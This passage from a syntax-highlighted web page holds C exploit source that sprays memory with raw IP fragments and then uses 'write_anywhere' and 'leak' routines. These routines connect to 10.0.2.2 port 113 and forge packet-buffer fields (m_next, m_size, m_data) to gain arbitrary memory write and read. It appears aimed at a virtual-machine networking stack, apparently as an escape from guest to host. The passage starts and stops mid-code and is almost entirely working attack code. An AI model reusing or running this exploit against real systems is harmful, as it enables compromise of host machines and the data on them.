class="hljs-string">&quot;[*] malloc 32 failed,size &lt; 0.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">uint32_t</span> *tmp;<br>    tmp = (<span class="hljs-type">uint32_t</span> *)<span class="hljs-built_in">malloc</span>(size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>));<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc 32 error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>));<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">malloc_char</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">if</span>(size &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc char failed,size &lt; 0.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-type">char</span> *tmp;<br>    tmp = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-literal">NULL</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] malloc char error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">memset</span>(tmp,<span class="hljs-number">0</span>,size*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>    <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> spray_id, <span class="hljs-type">int</span> spray_size)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> <span class="hljs-title">iphdr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> <span class="hljs-title">tcphdr</span>;</span><br>    <span class="hljs-type">char</span> *source_ip;<br>    <span class="hljs-type">char</span> *destion_ip;<br>    <span class="hljs-type">char</span> *interface;<br>    <span class="hljs-type">uint8_t</span> *packet;<br>    <span class="hljs-type">uint32_t</span> *ip_flags;<br>    <span class="hljs-type">uint32_t</span> *tcp_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span><br><br>    packet = malloc_8(IP_MAXPACKET);<br>    source_ip = malloc_char(INET_ADDRSTRLEN);<br>    destion_ip = malloc_char(INET_ADDRSTRLEN);<br>    interface = malloc_char(<span class="hljs-number">30</span>);<br>    ip_flags = malloc_32(<span class="hljs-number">4</span>);<br>    tcp_flags = malloc_32(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">strcpy</span>(interface, g_interface);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));<br>    <span class="hljs-built_in">memcpy</span>(ifr.ifr_name, interface, <span class="hljs-keyword">sizeof</span>(ifr.ifr_name));<br><br>    <span class="hljs-type">int</span> if_sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(if_sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket interface failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ioctl(if_sd, SIOCGIFINDEX, &amp;(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] ioctl find index error. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(if_sd);<br><br>    <span class="hljs-built_in">strcpy</span>(source_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(destion_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br><br>    iphdr.ip_v = <span class="hljs-number">4</span>;<br>    iphdr.ip_hl = IP4_HDRLEN/<span class="hljs-number">4</span>;<br>    iphdr.ip_tos = <span class="hljs-number">0</span>;<br>    iphdr.ip_len = htons(spray_size);<br>    iphdr.ip_id = htons(spray_id);<br>    iphdr.ip_ttl = <span class="hljs-number">0xFF</span>;<br>    iphdr.ip_p = <span class="hljs-number">0xFF</span>;<br><br>    ip_flags[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ip_flags[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ip_flags[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;<br>    ip_flags[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>    iphdr.ip_off = htons((ip_flags[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">15</span>) + (ip_flags[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">14</span>) + (ip_flags[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">13</span>) + (ip_flags[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">12</span>) + <span class="hljs-number">0</span>);<br>    <br>    inet_pton(AF_INET, source_ip, &amp;(iphdr.ip_src));<br>    inet_pton(AF_INET, destion_ip, &amp;(iphdr.ip_dst));<br>    iphdr.ip_sum = <span class="hljs-number">0</span>;<br>    iphdr.ip_sum = checksum((<span class="hljs-type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);<br><br>    <span class="hljs-built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN);<br><br>    <span class="hljs-type">uint8_t</span> payload[spray_size - IP4_HDRLEN];<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-number">0</span>, spray_size - IP4_HDRLEN);<br>    <span class="hljs-built_in">memcpy</span>(packet + IP4_HDRLEN, payload, spray_size - IP4_HDRLEN);<br><br>    <span class="hljs-built_in">memset</span>(&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr,<span class="hljs-keyword">sizeof</span>(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] setsockopt failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(sendto(sd, packet, spray_size, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] sendto failed. ---spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(sd);<br><br>    <span class="hljs-built_in">free</span>(packet);<br>    <span class="hljs-built_in">free</span>(source_ip);<br>    <span class="hljs-built_in">free</span>(destion_ip);<br>    <span class="hljs-built_in">free</span>(interface);<br>    <span class="hljs-built_in">free</span>(ip_flags);<br>    <span class="hljs-built_in">free</span>(tcp_flags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_ip_pkt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ip_pkt_info *pkt_info, <span class="hljs-type">uint8_t</span> *payload, <span class="hljs-type">int</span> payload_len)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> <span class="hljs-title">iphdr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> <span class="hljs-title">tcphdr</span>;</span><br>    <span class="hljs-type">char</span> *source_ip;<br>    <span class="hljs-type">char</span> *destion_ip;<br>    <span class="hljs-type">char</span> *interface;<br>    <span class="hljs-type">uint8_t</span> *packet;<br>    <span class="hljs-type">uint32_t</span> *ip_flags;<br>    <span class="hljs-type">uint32_t</span> *tcp_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span><br><br>    packet = malloc_8(IP_MAXPACKET);<br>    source_ip = malloc_char(INET_ADDRSTRLEN);<br>    destion_ip = malloc_char(INET_ADDRSTRLEN);<br>    interface = malloc_char(<span class="hljs-number">30</span>);<br>    ip_flags = malloc_32(<span class="hljs-number">4</span>);<br>    tcp_flags = malloc_32(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">strcpy</span>(interface, g_interface);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));<br>    <span class="hljs-built_in">memcpy</span>(ifr.ifr_name, interface, <span class="hljs-keyword">sizeof</span>(ifr.ifr_name));<br><br>    <span class="hljs-type">int</span> if_sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(if_sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket interface failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ioctl(if_sd, SIOCGIFINDEX, &amp;(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] ioctl find index error. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(if_sd);<br><br>    <span class="hljs-built_in">strcpy</span>(source_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(destion_ip,<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br><br>    iphdr.ip_v = <span class="hljs-number">4</span>;<br>    iphdr.ip_hl = IP4_HDRLEN/<span class="hljs-number">4</span>;<br>    iphdr.ip_tos = <span class="hljs-number">0</span>;<br>    iphdr.ip_len = htons(IP4_HDRLEN + payload_len);<br>    iphdr.ip_id = htons(pkt_info-&gt;ip_id);<br>    iphdr.ip_ttl = <span class="hljs-number">0xFF</span>;<br>    iphdr.ip_p = pkt_info-&gt;ip_p;<br><br>    ip_flags[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    ip_flags[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ip_flags[<span class="hljs-number">2</span>] = pkt_info-&gt;MF;<br>    ip_flags[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>    iphdr.ip_off = htons((ip_flags[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">15</span>) + (ip_flags[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">14</span>) + (ip_flags[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">13</span>) + (pkt_info-&gt;ip_off &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0</span>);<br>    <br>    inet_pton(AF_INET, source_ip, &amp;(iphdr.ip_src));<br>    inet_pton(AF_INET, destion_ip, &amp;(iphdr.ip_dst));<br>    iphdr.ip_sum = <span class="hljs-number">0</span>;<br>    iphdr.ip_sum = checksum((<span class="hljs-type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);<br><br>    <span class="hljs-built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN);<br>    <span class="hljs-built_in">memcpy</span>(packet + IP4_HDRLEN, payload, payload_len);<br><br>    <span class="hljs-built_in">memset</span>(&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr,<span class="hljs-keyword">sizeof</span>(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] setsockopt failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(sendto(sd, packet, payload_len + IP4_HDRLEN, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] sendto failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(sd);<br><br>    <span class="hljs-built_in">free</span>(packet);<br>    <span class="hljs-built_in">free</span>(source_ip);<br>    <span class="hljs-built_in">free</span>(destion_ip);<br>    <span class="hljs-built_in">free</span>(interface);<br>    <span class="hljs-built_in">free</span>(ip_flags);<br>    <span class="hljs-built_in">free</span>(tcp_flags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_anywhere</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">int</span> addr_len, <span class="hljs-type">uint8_t</span>* write_any_data, <span class="hljs-type">int</span> write_any_data_len)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;10.0.2.2&quot;</span>);<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(<span class="hljs-number">113</span>);<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket create failed. ---write_anywhere&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(connect(sd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] connect failed. ---write_anywhere&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info</span>;</span><br>    pkt_info.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info.ip_off = <span class="hljs-number">0</span>;<br>    pkt_info.ip_p = <span class="hljs-number">0xFF</span>;<br>    pkt_info.MF = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> payload_len = <span class="hljs-number">0x400</span>;<br>    <span class="hljs-type">uint8_t</span> *payload = malloc_8(payload_len);<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-string">&#x27;a&#x27;</span>, payload_len);<br>    send_ip_pkt(&amp;pkt_info, payload, payload_len);<br><br>    <span class="hljs-comment">/* prapare write any data */</span><br>    <span class="hljs-type">uint8_t</span> *write_data = malloc_8(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">uint8_t</span> *write_data_8 = write_data;<br>    <span class="hljs-type">uint8_t</span> *write_data_start = write_data;<br>    <span class="hljs-type">uint16_t</span> *write_data_16 = (<span class="hljs-type">uint16_t</span> *)write_data;<br>    <span class="hljs-type">uint32_t</span> *write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data;<br>    <span class="hljs-type">uint64_t</span> *write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data;<br>    <span class="hljs-built_in">memset</span>(write_data, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x6</span>; j++)&#123;<br>        write(sd, write_data, <span class="hljs-number">0x500</span>);<br>        <span class="hljs-comment">//sleep(0.2);</span><br>        <span class="hljs-comment">//printf(&quot;write data, time %d\n&quot;,j+1);</span><br>    &#125;<br>    write(sd, write_data, <span class="hljs-number">0x430</span>);<br>    <br><br>    *write_data_64++ = <span class="hljs-number">0</span>;<br>    *write_data_64++ = <span class="hljs-number">0x675</span>; <span class="hljs-comment">// chunk header</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_next</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prev</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_nextpkt</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prevpkt</span><br>    write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data_64;<br>    *write_data_32++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_flags</span><br>    *write_data_32++ = <span class="hljs-number">0x608</span>; <span class="hljs-comment">// m_size</span><br>    write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data_32;<br>    *write_data_64++ = <span class="hljs-number">0</span>; <span class="hljs-comment">// m_so</span><br>    write_data_8 = (<span class="hljs-type">uint8_t</span> *)write_data_64;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; addr_len; k++)&#123;<br>        *write_data_8++ = ((addr) &gt;&gt; (k*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-comment">//m_data</span><br>    &#125;<br><br>    write(sd, write_data_start, <span class="hljs-number">0x40</span> + addr_len);<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info_cat</span>;</span><br>    pkt_info_cat.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info_cat.ip_off = <span class="hljs-number">0x400</span>;<br>    pkt_info_cat.ip_p = <span class="hljs-number">0xFF</span>;<br>    pkt_info_cat.MF = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// if(stop_flag)&#123;</span><br>    <span class="hljs-comment">//    getchar();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    send_ip_pkt(&amp;pkt_info_cat, write_any_data, write_any_data_len);<br><br>    <span class="hljs-built_in">free</span>(payload);<br>    <span class="hljs-built_in">free</span>(write_data);<br>    close(sd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">int</span> addr_len)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;10.0.2.2&quot;</span>);<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(<span class="hljs-number">113</span>);<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket create failed. ---leak&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(connect(sd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] connect failed. ---leak&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info</span>;</span><br>    pkt_info.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info.ip_off = <span class="hljs-number">0x0</span>;<br>    pkt_info.ip_p = IPPROTO_ICMP;<br>    pkt_info.MF = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> payload_len = <span class="hljs-number">0x400</span>;<br>    <span class="hljs-type">uint8_t</span> *payload = malloc_8(payload_len);<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-string">&#x27;A&#x27;</span>, payload_len);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] send icmp 1 part.\n&quot;</span>);<br>    send_ip_pkt(&amp;pkt_info, payload, payload_len);<br><br>    <span class="hljs-comment">/* prapare write any data */</span><br>    <span class="hljs-type">uint8_t</span> *write_data = malloc_8(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">uint8_t</span> *write_data_8 = write_data;<br>    <span class="hljs-type">uint8_t</span> *write_data_start = write_data;<br>    <span class="hljs-type">uint16_t</span> *write_data_16 = (<span class="hljs-type">uint16_t</span> *)write_data;<br>    <span class="hljs-type">uint32_t</span> *write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data;<br>    <span class="hljs-type">uint64_t</span> *write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data;<br>    <span class="hljs-built_in">memset</span>(write_data, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x6</span>; j++)&#123;<br>        write(sd, write_data, <span class="hljs-number">0x500</span>);<br>        <span class="hljs-comment">//sleep(0.2);</span><br>        <span class="hljs-comment">//printf(&quot;write data, time %d\n&quot;,j+1);</span><br>    &#125;<br>    write(sd, write_data, <span class="hljs-number">0x430</span>);<br>    <br><br>    *write_data_64++ = <span class="hljs-number">0</span>;<br>    *write_data_64++ = <span class="hljs-number">0x675</span>; <span class="hljs-comment">// chunk header</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_next</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prev</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_nextpkt</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prevpkt</span><br>    write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data_64;<br>    *write_data_32++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_flags</span><br>    *write_data_32++ = <span class="hljs-number">0x608</span>; <span class="hljs-comment">// m_size</span><br>    write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data_32;<br>    *write_data_64++ = <span class="hljs-number">0</span>; <span class="hljs-comment">// m_so</span><br>    write_data_8 = (<span class="hljs-type">uint8_t</span> *)write_data_64;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; addr_len; k++)&#123;<br>        *write_data_8++ = ((addr) &gt;&gt; (k*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-comment">//m_data</span><br>    &#125;<br><br>    write(sd, write_data_start, <span class="hljs-number">0x40</span> + addr_len);<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info_2</span>;</span><br>    pkt_info_2.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info_2.ip_off = <span class="hljs-number">0x400</span>;<br>    pkt_info_2.ip_p = IPPROTO_ICMP;<br>    pkt_info_2.MF = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> payload_len_2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> recv_sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));<br>    <span class="hljs-keyword">if</span>(recv_sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;socket recv failed. ---leak.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    send_ip_pkt(&amp;pkt_info_2, payload, payload_len_2);<br><br>    <span class="hljs-comment">// if(stop_flag)&#123;</span><br>    <span class="hljs-comment">//    getchar();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-type">int</span> recv_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">int</span> recv_size;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">recv_ip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmp</span> *<span class="hljs-title">recv_icmp</span>;</span><br>    <span class="hljs-type">uint8_t</span> recv_buf[IP_MAXPACKET];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">recv_sin</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;recv_sin, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(recv_sin));<br>    <span class="hljs-type">socklen_t</span> sock_addr_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">wait</span>, <span class="hljs-title">t1</span>, <span class="hljs-title">t2</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timezone</span> <span class="hljs-title">tz</span>;</span><br>    <span class="hljs-type">double</span> tt;<br> <br>    (<span class="hljs-type">void</span>)gettimeofday(&amp;t1, &amp;tz);<br>    wait.tv_sec = <span class="hljs-number">3</span>;                              <span class="hljs-comment">// 3 secends timeout.</span><br>    wait.tv_usec = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(setsockopt(recv_sd, SOL_SOCKET, SO_RCVTIMEO, (<span class="hljs-type">char</span> *)&amp;wait, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> timeval)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] setsockopt timeout failed. ---leak&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    recv_ip = (<span class="hljs-keyword">struct</span> ip *)(recv_buf + ETH_HDRLEN);<br>    recv_icmp = (<span class="hljs-keyword">struct</span> icmp *)(recv_buf + ETH_HDRLEN + IP4_HDRLEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start to recvfrom data.\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-built_in">memset</span>(recv_buf, <span class="hljs-number">0</span>, IP_MAXPACKET*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint8_t</span>));<br>        <span class="hljs-built_in">memset</span>(&amp;recv_sin, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr));<br>        <span class="hljs-keyword">if</span>((recv_size = recvfrom(recv_sd, recv_buf, IP_MAXPACKET, <span class="hljs-number">0</span>, (<span 